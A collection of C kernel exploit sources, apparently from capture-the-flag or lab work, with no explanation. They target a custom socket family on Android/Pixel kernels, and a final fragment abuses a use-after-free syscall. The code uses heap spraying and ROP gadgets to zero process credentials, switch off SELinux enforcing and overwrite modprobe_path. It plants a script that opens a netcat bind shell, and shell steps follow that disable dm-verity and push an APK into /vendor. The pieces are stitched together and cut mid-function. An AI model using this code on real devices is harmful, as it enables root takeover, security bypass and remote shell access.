    if(read(pipes[0], address, len) != len)
        goto end;

    ret = 0;
end:
    close(pipes[1]);
    close(pipes[0]);
    return ret;
}

size_t read_qword(size_t addr) {
   size_t val = 0;
   if (read_at_address_pipe((void *)addr,&val,8)) {
      printf("read qword errorn");
      exit(-1);
   }
   return val;
}

uint32_t read_dword(size_t addr) {
   uint32_t val = 0;
   if (read_at_address_pipe((void *)addr,&val,4)) {
      printf("read dword errorn");
      exit(-1);
   }
   return val;
}

void write_dword(size_t addr,uint32_t val) {
   if (write_at_address_pipe((void *)addr,&val,4)) {
      printf("read qword errorn");
      exit(-1);
   }
}

void write_qword(size_t addr,size_t val) {
   if (write_at_address_pipe((void *)addr,&val,8)) {
      printf("read qword errorn");
      exit(-1);
   }
}

size_t get_current_task() {
    size_t task = INIT_TASK;
    size_t result = 0;
    int i = 0;
    int pid;
    int current_task_pid = getpid();

    while(result == 0 && i++ < 1000) {
        task = read_qword(task + TASK_OFFSET) - TASK_OFFSET;
        printf("task: %#lxn", task);
        if(task == INIT_TASK) {
            break;
        }
        pid = read_dword(task + PID_OFFSET);
        printf("pid: %dn", pid);
        if(pid == current_task_pid) {
            result = task;
        }
    }

    return result;
}

int main() {
    size_t serverfd;
    struct avss_addr addr;
    uint64_t score;
    uint64_t x = 0;
    pthread_t client_th;
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(1,&mask);

    if(sched_setaffinity(0,sizeof(mask),&mask)== -1) {
       perror("sched setaffinity");
       return -1;
    }

   memset(payload,'a',0x1000);

   /*my custom kernel
   *(int *)(&payload[0x114]) = 1;
   *(int *)(&payload[0x64]) = 1;

   *(size_t *)(&payload[0x28]) = ksymtab___sk_backlog_rcv - 0x68;
   //gadget
   *(size_t *)(&payload[0x290]) = kernel_setsockopt;
   //return to userspace
   *(size_t *)(&payload[0x288]) = add_sp_40_ret;*/

   //pixel 1 kernel
   *(int *)(&payload[0x11C]) = 1;
   *(int *)(&payload[0x6C]) = 1;

   *(size_t *)(&payload[0x28]) = ksymtab___sk_backlog_rcv - 0x68;
   //gadget
   *(size_t *)(&payload[0x2b0]) = kernel_setsockopt;

   *(size_t *)(&payload[0x100]) = 0x8000;
   //return to userspace
   *(size_t *)(&payload[0x2a8]) = add_sp_40_ret;

    serverfd = create_server(2023,1);
    if (pthread_create(&client_th, NULL, client_thread, (void *)serverfd) != 0) {
        perror("Failed to create client thread");
        return 1;
    }

    while (!client_thread_finished) {
       score = 0;
       if (syscall(281, serverfd, &score) <0) {
          //printf("syscall errorn");
       }
       //printf("score=%d,x=%dn",score,x);
    }
    //close(serverfd);
    printf("bypass PXN donen");
    size_t current_task = get_current_task();
    printf("current_task_addr=0x%lxn",current_task);
    size_t current_cred = read_qword(current_task + PTR_CRED_OFFSET);
    printf("current_cred: 0x%lxn", current_cred);

    for(int i = 0; i < 4; i ++) {
        write_qword(current_cred + 4 + i * 8, 0);
    }
    write_dword(selinux_enforcing, 0);
    system("/system/bin/sh");
    return 0;
}
./busybox mount -o remount,rw /vendor
mkdir /vendor/app/Polaris
cp polaris.apk /vendor/app/Polaris
reboot
    #define _GNU_SOURCE
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <fcntl.h>
    #include <errno.h>
    #include <sys/syscall.h>
    #include 
    #include <sys/xattr.h>
    #include <netinet/in.h>
    #include <linux/socket.h>
    #include <linux/unistd.h>
    #include <sys/msg.h>
    #include <linux/keyctl.h>
    #include <sched.h>

    #define AF_AVSS 1024
    #define AVSS_PORT 2024

size_t kernel_base;
size_t gadget_leak;
size_t gadget_write;
size_t init_task;
//pixel 2 kernel
    #define TASK_OFFSET 0x440
    #define PID_OFFSET 0x538
    #define PTR_CRED_OFFSET 0x6E8

struct avss_addr {
    sa_family_t avss_family;
    uint16_t year;
    uint32_t id;
} __attribute__((packed));

struct avss_data {
    uint8_t score;
    char buff[128];
} __attribute__((packed));

int create_server(int year,int id) {
    int sockfd;
    struct avss_addr addr;
    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket failed");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.avss_family = AF_AVSS;
    addr.year = year;
    addr.id = id;

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind failed");
        close(sockfd);
        return -1;
    }
    return sockfd;
}

int client_connect(int year,int id) {
    int sockfd;
    struct avss_addr addr;

    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket failed");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.avss_family = AF_AVSS;
    addr.year = year;
    addr.id = id;

    if (connect(sockfd,(struct sockaddr *)&addr, sizeof(addr)) < 0) {
       perror("connect failed");
       close(sockfd);
       return -1;
    }
    return sockfd;
}

char payload[0x1000];
int client_thread_finished = 0;

void spray_addkey(int count) {
    int i;
    char desc[0x400];
    for (i = 0; i < count; i++) {
        memset(desc, 'b', 0x300);
        desc[0x300] = 0;
        syscall(__NR_add_key, "user", desc, payload, 0x400, KEY_SPEC_PROCESS_KEYRING);
    }
}

int newserverfd;
int newclient_fd;

void *client_thread(void *arg) {
   size_t serverfd = (size_t)arg;
   struct avss_data data;

   int client_fd = client_connect(2023,1);

   memset(&data, 0, sizeof(data));
   data.score = 85;  // 示例得分
   strcpy(data.buff, "Hello from client!");

   if (send(client_fd, &data, sizeof(data),0) < 0) {
       perror("sendto failed");
       close(client_fd);
       return NULL;
   }
   printf("Message sent to server.n");
   usleep(100000);
   //UAF
   close(serverfd);
   usleep(500000);
   //使用一个任意文件占位原来的serverfd描述符，但是不能用avss_socket去，不然sk指针会重新获取
   open("/dev/null",0);
   //使用newclient的sock结构体去占位，经过getscore中的sk_free时，newclient的引用将减1但没释放
   newclient_fd = client_connect(2023,2);
   close(serverfd);
   //关闭newclient的一个引用，由于之前减了1，这次关闭引用后，newclient的引用为0将被释放
   close(newserverfd);
   sleep(5);
   close(client_fd);
   client_thread_finished = 1;
   return NULL;
}

ssize_t syscall_send(int sockfd, const void *buf, size_t len, int flags) {
    ssize_t ret;

    asm volatile (
        "mov x8, %1n"
        "mov x0, %2n"
        "mov x1, %3n"
        "mov x2, %4n"
        "mov x3, %5n"
        "mov x4, #0n"
        "mov x5, #0n"
        "svc #0n"
        "mov %0, x0n"
        : "=r" (ret)
        : "r" (SYS_sendto), "r" (sockfd), "r" (buf), "r" (len), "r" (flags)  // 输入寄存器
        : "x0", "x1", "x2", "x3", "x4", "x5", "x8" // clobbered 寄存器
    );

    return ret;
}

int client_trigger;

uint32_t read_dword(size_t addr) {
    struct avss_addr sk_addr;
    memset(payload, 0, 0x360);
    *(size_t *)(&payload[0x180]) = addr - 0x58;
    // sock_has_perm
    *(size_t *)(&payload[0x270]) = kernel_base + 0x12512f8; // fake a sk_security_struct

    *(size_t *)(&payload[0x2c8]) = 2023;        // year
    *(size_t *)(&payload[0x2cc]) = 5;           // id
    payload[0x2d0] = 1;                         // score
    *(size_t *)(&payload[0x2e0]) = gadget_leak; // parse
    spray_addkey(100);

    memset(&sk_addr, 0, sizeof(sk_addr));
    sk_addr.avss_family = AF_AVSS;
    sk_addr.year = 2023;
    sk_addr.id = 5;

    if (connect(client_trigger, (struct sockaddr *)&sk_addr, sizeof(sk_addr)) < 0) {
        perror("client trigger connect failed");
        return -1;
    }

    uint32_t x = (uint32_t)syscall_send(client_trigger, "aaaa", 4, 0);
    close(client_trigger);
    client_trigger = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (client_trigger < 0) {
        perror("socket failed");
        return -1;
    }
    return x;
}

size_t read_qword(size_t addr) {
   uint32_t low = read_dword(addr);
   uint32_t high = read_dword(addr + 4);
   size_t val = low + ((size_t)high << 32);
   return val;
}

int write_qword(size_t addr,size_t val) {
    struct avss_addr sk_addr;
    memset(payload, 0, 0x360);
    *(size_t *)(&payload[0x20]) = addr - 0x68;
    // sock_has_perm
    *(size_t *)(&payload[0x270]) = kernel_base + 0x12512f8; // fake a sk_security_struct

    *(size_t *)(&payload[0x2c8]) = 2023;        // year
    *(size_t *)(&payload[0x2cc]) = 5;           // id
    payload[0x2d0] = 1;                         // score
    *(size_t *)(&payload[0x2e0]) = gadget_write; // parse
    spray_addkey(100);

    memset(&sk_addr, 0, sizeof(sk_addr));
    sk_addr.avss_family = AF_AVSS;
    sk_addr.year = 2023;
    sk_addr.id = 5;

    if (connect(client_trigger, (struct sockaddr *)&sk_addr, sizeof(sk_addr)) < 0) {
        perror("client trigger connect failed");
        return -1;
    }

    uint32_t x = (uint32_t)syscall_send(client_trigger, "ha1vk", val, 0);
    close(client_trigger);
    client_trigger = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (client_trigger < 0) {
        perror("socket failed");
        return -1;
    }
    return x;
}

size_t get_current_task() {
    size_t task = init_task;
    size_t result = 0;
    int i = 0;
    int pid;
    int current_task_pid = getpid();

    while(result == 0 && i++ < 1000) {
        task = read_qword(task + TASK_OFFSET) - TASK_OFFSET;
        printf("task: %#lxn", task);
        if(task == init_task) {
            break;
        }
        pid = read_dword(task + PID_OFFSET);
        printf("pid: %dn", pid);
        if(pid == current_task_pid) {
            result = task;
        }
    }

    return result;
}

int main() {
    size_t serverfd;
    struct avss_addr addr;
    uint64_t score;
    uint64_t x = 0;
    pthread_t client_th;

    //全部分配到一个CPU上执行，否则很难堆喷成功
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1) {
        perror("sched setaffinity");
        return -1;
    }

    memset(payload, 0, 0x1000);

    serverfd = create_server(2023, 1);
    newserverfd = create_server(2023, 2);
    
    client_trigger = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (client_trigger < 0) {
        perror("socket failed");
        return -1;
    }

    if (pthread_create(&client_th, NULL, client_thread, (void *)serverfd) != 0) {
        perror("Failed to create client thread");
        return 1;
    }

    while (!client_thread_finished) {
        score = 0;
        if (syscall(285, serverfd, &score) < 0) {
            // printf("syscall errorn");
        }
    }

    // now newclient_fd is UAF
    printf("start leaking kernel base(wait a few minutes)...n");
    *(uint16_t *)&payload[0x10] = 0x400;
    *(uint32_t *)&payload[0x2C8] = 2023; //year
    *(uint32_t *)&payload[0x2CC] = 4; //iod
    payload[0x2D0] = 100; //score
    *(uint64_t *)&payload[0x2D8] = 0; //peer
    *(uint64_t *)&payload[0x2E0] = 0xFFFFFF80090D7E34; //avss_default_parse
    while (1) {
       *(uint64_t *)&payload[0x2E0] += 0x100000;
       spray_addkey(100);
       if (syscall(285, newclient_fd, &score) == 0) {
          printf("found kernel addressn");
          break;
       }
    }
    kernel_base = *(uint64_t *)&payload[0x2E0] - 0x1057e34;
    //kernel_base = 0xffffff8d6a480000;
    printf("kernel_base=0x%lxn", kernel_base);
    init_task = kernel_base + 0x254d750;
    // 0xffffff800869a73c : ldr x0, [x0, #0x180] ; ldr x0, [x0, #0x58] ; ret
    gadget_leak = kernel_base + 0x61a73c;
    //0xffffff80088e4dd0 : ldr x1, [x0, #0x20] ; str x2, [x1, #0x68] ; ldrb w1, [x0, #0x35] ; orr w1, w1, #4 ; strb w1, [x0, #0x35] ; ret
    gadget_write = kernel_base + 0x864dd0;
    size_t selinux_enforcing = kernel_base + 0x285fa4c;
    // 伪造sock结构体
    memset(payload, 0, 0x360);
    // 绕过selinux函数sock_has_perm的检查
    *(size_t *)(&payload[0x270]) = kernel_base + 0x12512f8; // fake a sk_security_struct
    spray_addkey(100);

    memset(&addr, 0, sizeof(addr));
    addr.avss_family = AF_AVSS;
    addr.year = 2023;
    addr.id = 5;

    if (bind(newclient_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind failed");
        return -1;
    }

    size_t current_task = get_current_task();
    printf("current_task_addr=0x%lxn",current_task);
    size_t current_cred = read_qword(current_task + PTR_CRED_OFFSET);
    printf("current_cred: 0x%lxn", current_cred);

    for(int i = 0; i < 4; i ++) {
        write_qword(current_cred + 4 + i * 8, 0);
    }

    write_qword(selinux_enforcing-4,0xffffffff00000000);
    memset(payload, 0, 0x400);
    //设置sk的引用，避免最后程序退出时关闭文件描述符时释放这个UAF的sk造成系统崩溃
    *(size_t *)(&payload[0x80]) = 0xff;
    *(size_t *)(&payload[0x120]) = 0xff;
    spray_addkey(100);
    
    system("/system/bin/sh");

    return 0;
}
./disable-dm-verity
reboot

./busybox mount -o remount,rw /vendor
mkdir /vendor/app/Polaris
cp polaris.apk /vendor/app/Polaris
reboot
void writeByte(size_t addr,int byte) {
    size_t serverfd;
    pthread_t client_th;
    uint64_t score;
    memset(payload, 0, 0x1000);
    client_thread_finished = 0;

    serverfd = create_server(2023, 1);
    newserverfd = create_server(2023, 2);

    if (pthread_create(&client_th, NULL, client_thread, (void *)serverfd) != 0) {
        perror("Failed to create client thread");
        return;
    }

    while (!client_thread_finished) {
        score = 0;
        if (syscall(291, serverfd, &score) < 0) {
            // printf("syscall errorn");
        }
    }

    spray_pipe(1);

    *(uint64_t *)&payload[0x80] = 0x2;
    *(uint64_t *)&payload[0x2c8] = selinux_enforcing - 0x2c8;
    *(uint64_t *)&payload[0x2b8] = 1;
    *(uint64_t *)&payload[0x68] = bss | byte;
    *(uint64_t *)&payload[0x70] = addr;
    setxattr("/data/local/tmp", "ha1vk", payload, 0x400, 0);
    close(newclient_fd);
    for (int i=3;i<12;i++) {
        close(i);
    }
    //getchar();
}
    #define _GNU_SOURCE
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <fcntl.h>
    #include <errno.h>
    #include <sys/syscall.h>
    #include 
    #include <sys/xattr.h>
    #include <netinet/in.h>
    #include <linux/socket.h>
    #include <linux/unistd.h>
    #include <sys/msg.h>
    #include <linux/keyctl.h>
    #include <sched.h>
    #include <sys/mman.h>

    #define AF_AVSS 1024
    #define AVSS_PORT 2024

size_t kernel_base;
size_t selinux_enforcing;
size_t modprobe_path;
size_t bss;

struct avss_addr {
    sa_family_t avss_family;
    uint16_t year;
    uint32_t id;
} __attribute__((packed));

struct avss_data {
    uint8_t score;
    char buff[128];
} __attribute__((packed));

int create_server(int year,int id) {
    int sockfd;
    struct avss_addr addr;
    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket failed");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.avss_family = AF_AVSS;
    addr.year = year;
    addr.id = id;

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind failed");
        close(sockfd);
        return -1;
    }
    return sockfd;
}

int client_connect(int year,int id) {
    int sockfd;
    struct avss_addr addr;

    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket failed");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.avss_family = AF_AVSS;
    addr.year = year;
    addr.id = id;

    if (connect(sockfd,(struct sockaddr *)&addr, sizeof(addr)) < 0) {
       perror("connect failed");
       close(sockfd);
       return -1;
    }
    return sockfd;
}

char payload[0x1000];
int client_thread_finished = 0;

void spray_addkey(int count) {
    int i;
    char desc[0x400];
    for (i = 0; i < count; i++) {
        memset(desc, 'b', 0x300);
        desc[0x300] = 0;
        syscall(__NR_add_key, "user", desc, payload, 0x400, KEY_SPEC_PROCESS_KEYRING);
    }
}

int newserverfd;
int newclient_fd;

void *client_thread(void *arg) {
   size_t serverfd = (size_t)arg;
   struct avss_data data;

   int client_fd = client_connect(2023,1);

   memset(&data, 0, sizeof(data));
   data.score = 85;  // 示例得分
   strcpy(data.buff, "Hello from client!");

   if (send(client_fd, &data, sizeof(data),0) < 0) {
       perror("sendto failed");
       close(client_fd);
       return NULL;
   }
   printf("Message sent to server.n");
   usleep(100000);
   //UAF
   close(serverfd);
   usleep(500000);
   //使用一个任意文件占位原来的serverfd描述符，但是不能用avss_socket去，不然sk指针会重新获取
   open("/dev/null",0);
   //使用newclient的sock结构体去占位，经过getscore中的sk_free时，newclient的引用将减1但没释放
   newclient_fd = client_connect(2023,2);
   close(serverfd);
   //关闭newclient的一个引用，由于之前减了1，这次关闭引用后，newclient的引用为0将被释放
   close(newserverfd);
   sleep(3);
   close(client_fd);
   client_thread_finished = 1;
   return NULL;
}

ssize_t syscall_send(int sockfd, const void *buf, size_t len, int flags) {
    ssize_t ret;

    asm volatile (
        "mov x8, %1n"
        "mov x0, %2n"
        "mov x1, %3n"
        "mov x2, %4n"
        "mov x3, %5n"
        "mov x4, #0n"
        "mov x5, #0n"
        "svc #0n"
        "mov %0, x0n"
        : "=r" (ret)
        : "r" (SYS_sendto), "r" (sockfd), "r" (buf), "r" (len), "r" (flags)  // 输入寄存器
        : "x0", "x1", "x2", "x3", "x4", "x5", "x8" // clobbered 寄存器
    );

    return ret;
}

    #define NUM_PIPE 100
int pipefd[NUM_PIPE][2];
void spray_pipe(int n) {
    for (int i=0;i<n;i++) {
        pipe(pipefd[i]);
    }
}
void writeByte(size_t addr,int byte) {
    size_t serverfd;
    pthread_t client_th;
    uint64_t score;
    memset(payload, 0, 0x1000);
    client_thread_finished = 0;

    serverfd = create_server(2023, 1);
    newserverfd = create_server(2023, 2);

    if (pthread_create(&client_th, NULL, client_thread, (void *)serverfd) != 0) {
        perror("Failed to create client thread");
        return;
    }

    while (!client_thread_finished) {
        score = 0;
        if (syscall(291, serverfd, &score) < 0) {
            // printf("syscall errorn");
        }
    }

    spray_pipe(1);

    *(uint64_t *)&payload[0x80] = 0x2;
    *(uint64_t *)&payload[0x2c8] = selinux_enforcing - 0x2c8;
    *(uint64_t *)&payload[0x2b8] = 1;
    *(uint64_t *)&payload[0x68] = bss | byte;
    *(uint64_t *)&payload[0x70] = addr;
    setxattr("/data/local/tmp", "ha1vk", payload, 0x400, 0);
    close(newclient_fd);
    for (int i=3;i<12;i++) {
        close(i);
    }
    //getchar();
}
void setup_rootscript() {
    system("echo '#!/system/bin/sh' > /data/local/tmp/g");
    system("echo '/data/local/tmp/busybox nc -lp 2333 -e /system/bin/sh' >> /data/local/tmp/g");
    system("echo -e 'xffxffxffxff' >> /data/local/tmp/x");
    system("chmod +x /data/local/tmp/busybox /data/local/tmp/x /data/local/tmp/g");
    int test = popen("/data/local/tmp/g","r");
    close(test);
}
int main() {
    size_t serverfd;
    struct avss_addr addr;
    uint64_t score;
    uint64_t x = 0;
    pthread_t client_th;

    //全部分配到一个CPU上执行，否则很难堆喷成功
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1) {
        perror("sched setaffinity");
        return -1;
    }
    setup_rootscript();

    memset(payload, 0, 0x1000);
    serverfd = create_server(2023, 1);
    newserverfd = create_server(2023, 2);

    if (pthread_create(&client_th, NULL, client_thread, (void *)serverfd) != 0) {
        perror("Failed to create client thread");
        return 1;
    }

    while (!client_thread_finished) {
        score = 0;
        if (syscall(291, serverfd, &score) < 0) {
            // printf("syscall errorn");
        }
    }

    // now newclient_fd is UAF
    printf("start leaking kernel base(wait a few minutes)...n");
    *(uint16_t *)&payload[0x10] = 0x400;
    *(uint32_t *)&payload[0x2B8] = 2023; //year
    *(uint32_t *)&payload[0x2BC] = 4; //id
    payload[0x2C0] = 100; //score
    *(uint64_t *)&payload[0x2C8] = 0; //peer
    *(uint64_t *)&payload[0x2D0] = 0xFFFFFF8009934470; //avss_default_parse
    while (1) {
       *(uint64_t *)&payload[0x2D0] += 0x100000;
       spray_addkey(100);
       if (syscall(291, newclient_fd, &score) == 0) {
          printf("found kernel addressn");
          break;
       }
    }
    //关闭全部描述符
    for (int i=3;i<12;i++) {
        close(i);
    }

    kernel_base = *(uint64_t *)&payload[0x2D0] - 0x18b4470;
    //kernel_base = 0xffffff827c280000;
    selinux_enforcing = kernel_base + 0x2de9000;
    modprobe_path = kernel_base + 0x2bafa80;
    bss = kernel_base + 0x2deb000;
    printf("kernel_base=0x%lxn", kernel_base);
    char *root_script = "/data/local/tmp/g";
    int len = strlen(root_script) + 1;
    for (int i=0;i<len;i++) {
        printf("rProgress: %d%% ", i * 100 / len);
        writeByte(modprobe_path+i,root_script[i]);
    }

    printf("ntrigger shell...n");
    system("ps -e  | grep busybox | awk '{print $2}' | xargs kill -9");
    system("/data/local/tmp/x &");
    sleep(1);
    printf("your shell is here:n");
    system("/data/local/tmp/busybox nc 127.0.0.1 2333");
    return 0;
}
./disable-dm-verity9
reboot

./busybox mount -o remount,rw /vendor
mkdir /vendor/app/Polaris
cp polaris.apk /vendor/app/Polaris
reboot
    #define _GNU_SOURCE
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include 
    #include <fcntl.h>
    #include <string.h>
    #include <sys/user.h>
    #include <sys/msg.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <sys/sem.h>
    #include <ctype.h>
    #include <sched.h>
    #include <stdint.h>
    #include <linux/keyctl.h>
    #include <sys/prctl.h>
    #include <signal.h>

    #define DB_OFFSET(idx) ((void*)(&(((struct user*)0)->u_debugreg[idx])))
    #define CPU_ENTRY_AREA 0xfffffe0000000000
    #ifndef MSG_COPY
    #define MSG_COPY        040000  /* copy (not remove) all queue messages */
    #endif
    #define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}

// #define DB_STACK_ADDR 0xfffffe0000010f30

void err_msg(char *msg)
{
    printf(" 33[31m 33[1m[!] %s  33[0mn",msg);
    exit(0);
}
void output_msg(char *msg)
{
    printf(" 33[34m 33[1m[+] %s  33[0mn",msg);
}
void print_addr(char *msg, size_t value)
{
    printf(" 33[35m 33[1m[*] %s == %p 33[0mn",msg,(size_t *)value);
}
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    output_msg("Process binded to core");
}

/* root checker and shell poper */
void get_root_shell(void)       
{
    if(getuid()) {
        puts(" 33[31m 33[1m[x] Failed to get the root! 33[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts(" 33[32m 33[1m[+] Successful to get the root.  33[0m");
    puts(" 33[34m 33[1m[*] Execve root shell now... 33[0m");
    
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

// this is a universal function to print binary data from a char* array
void print_binary(void *addr, int len) 
{
    size_t *buf64 = (size_t *) addr;
    char *buf8 = (char *) addr;
    for (int i = 0; i < len / 8; i += 2) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 2; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 16 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

// 0xffffffff8103c827: pop rdi; ret;
// 0xffffffff8111874f: pop rsp; ret;
    #define __NR_uaf 602
    #define MSG_SPRAY_NUM 0x10
    #define PIPE_SPRAY_NUM 200
/* for pipe escalation */
    #define SND_PIPE_BUF_SZ 96
    #define TRD_PIPE_BUF_SZ 192

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
 struct page *page;
 unsigned int offset, len;
 const struct pipe_buf_operations *ops;
 unsigned int flags;
 unsigned long private;
};

struct pipe_buf_operations {
 /*
  * ->confirm() verifies that the data in the pipe buffer is there
  * and that the contents are good. If the pages in the pipe belong
  * to a file system, we may need to wait for IO completion in this
  * hook. Returns 0 for good, or a negative error value in case of
  * error.  If not present all pages are considered good.
  */
 int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

 /*
  * When the contents of this pipe buffer has been completely
  * consumed by a reader, ->release() is called.
  */
 void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

 /*
  * Attempt to take ownership of the pipe buffer and its contents.
  * ->try_steal() returns %true for success, in which case the contents
  * of the pipe (the buf->page) is locked and now completely owned by the
  * caller. The page may then be transferred to a different mapping, the
  * most often used case is insertion into different file address space
  * cache.
  */
 int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

 /*
  * Get a reference to the pipe buffer.
  */
 int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};

int new_buffer(int idx){
    char user_addr;
    size_t size = 0;
    return syscall(__NR_uaf, &user_addr, size, (idx<<8));
}

int edit_buffer(int idx, char *user_addr, size_t size){
    return syscall(__NR_uaf, user_addr, size, (idx<<8) | 0x3);
}

int show_buffer(int idx, char *user_addr, size_t size){
    return syscall(__NR_uaf, user_addr, size, (idx<<8) | 0x2);
}

int del_buffer(int idx){
    char user_addr;
    size_t size = 0;
    return syscall(__NR_uaf, &user_addr, size, (idx<<8) | 0x1);
}

size_t page_offset_base;
size_t kernel_base = 0xffffffc008000000, kernel_offset = 0;

int pipe_fd[0x400][2];
int orig_pid = -1, victim_pid = -1;
int snd_orig_pid = -1, snd_vicitm_pid = -1;
int self_2nd_pipe_pid = -1, self_3rd_pipe_pid = -1, self_4th_pipe_pid = -1;
struct pipe_buffer info_pipe_buf;

struct pipe_buffer evil_2nd_buf, evil_3rd_buf, evil_4th_buf;
char temp_zero_buf[0x1000]= { ' ' };
void setup_evil_pipe(void)
{
    /* init the initial val for 2nd,3rd and 4th pipe, for recovering only */
    memcpy(&evil_2nd_buf, &info_pipe_buf, sizeof(evil_2nd_buf));
    memcpy(&evil_3rd_buf, &info_pipe_buf, sizeof(evil_3rd_buf));
    memcpy(&evil_4th_buf, &info_pipe_buf, sizeof(evil_4th_buf));

    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0xff0;

    /* hijack the 3rd pipe pointing to 4th */
    evil_3rd_buf.offset = 0x80 * 4;
    evil_3rd_buf.len = 0;
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    evil_4th_buf.offset = 0x80 * 2;
    evil_4th_buf.len = 0;
}

void arbitrary_read_by_pipe(struct page *page_to_read, void *dst)
{
    /* page to read */
    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0x1ff8;
    evil_2nd_buf.page = page_to_read;

    /* hijack the 4th pipe pointing to 2nd pipe */
    write(pipe_fd[self_3rd_pipe_pid][1], &evil_4th_buf, sizeof(evil_4th_buf));

    /* hijack the 2nd pipe for arbitrary read */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_2nd_buf, sizeof(evil_2nd_buf));
    write(pipe_fd[self_4th_pipe_pid][1], 
          temp_zero_buf, 
          0x80-sizeof(evil_2nd_buf));
    
    /* hijack the 3rd pipe to point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    /* read out data */
    read(pipe_fd[self_2nd_pipe_pid][0], dst, 0xfff);
}

void arbitrary_write_by_pipe(struct page *page_to_write, void *src, size_t len)
{
    /* page to write */
    evil_2nd_buf.page = page_to_write;
    evil_2nd_buf.offset = 0;
    evil_2nd_buf.len = 0;

    /* hijack the 4th pipe pointing to 2nd pipe */
    write(pipe_fd[self_3rd_pipe_pid][1], &evil_4th_buf, sizeof(evil_4th_buf));

    /* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_2nd_buf, sizeof(evil_2nd_buf));
    write(pipe_fd[self_4th_pipe_pid][1], 
          temp_zero_buf, 
          0x80 - sizeof(evil_2nd_buf));
    
    /* hijack the 3rd pipe to point to 4th pipe */
    write(pipe_fd[self_4th_pipe_pid][1], &evil_3rd_buf, sizeof(evil_3rd_buf));

    /* write data into dst page */
    write(pipe_fd[self_2nd_pipe_pid][1], src, len);

}

size_t *tsk_buf, current_task_page, current_task, parent_task;
size_t vmemmap_base = 0xfffffffeffe00000;
char buf[0x1000];
size_t cred, real_cred;
size_t modprobe_path = 0xffffff80029a0e48;
void info_leaking_by_arbitrary_pipe()
{
    size_t *comm_addr;

    memset(buf, 0, sizeof(buf));

    puts("[*] Setting up kernel arbitrary read & write...");
    setup_evil_pipe();

    /* now seeking for the task_struct in kernel memory */
    puts("[*] Seeking task_struct in memory...");
    prctl(PR_SET_NAME, "try2findmehenry");

    for (int i = 0; 1; i++) {
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + i * 0x40), buf);
    
        comm_addr = memmem(buf, 0xf00, "try2findmehenry", 15);
        if (comm_addr) output_msg("you find me");
        if (comm_addr && (comm_addr[-2] > 0xffff000000000000) /* task->cred 0xffffff800339ff00*/ 
            && (comm_addr[-3] > 0xffff000000000000)){ /* task->real_cred */
            if (comm_addr)  {
                printf("============================================n");
                print_binary(buf, 0xf00);
            }
            cred = comm_addr[-2];
            real_cred = comm_addr[-3];
            print_addr("cred", cred);
            print_addr("real_cred", real_cred);
            page_offset_base = cred & 0xfffffffff0000000;
            print_addr("page_offset_base", page_offset_base);
            break;
        }
    }
}

size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
{
    size_t page_count;

    page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;
    
    return vmemmap_base + page_count * 0x40;
}

void privilege_escalation_by_task_overwrite(void)
{
    size_t real_cred_page_addr = direct_map_addr_to_page_addr(real_cred);

    /* now, changing the current task_struct to get the full root :) */
    puts("[*] Escalating ROOT privilege now...");

    arbitrary_read_by_pipe((struct page*) real_cred_page_addr, buf);
    printf("==============before overwrite=========");
    print_binary(buf, 0x1000);
    size_t real_cred_offset = real_cred & 0xfff;
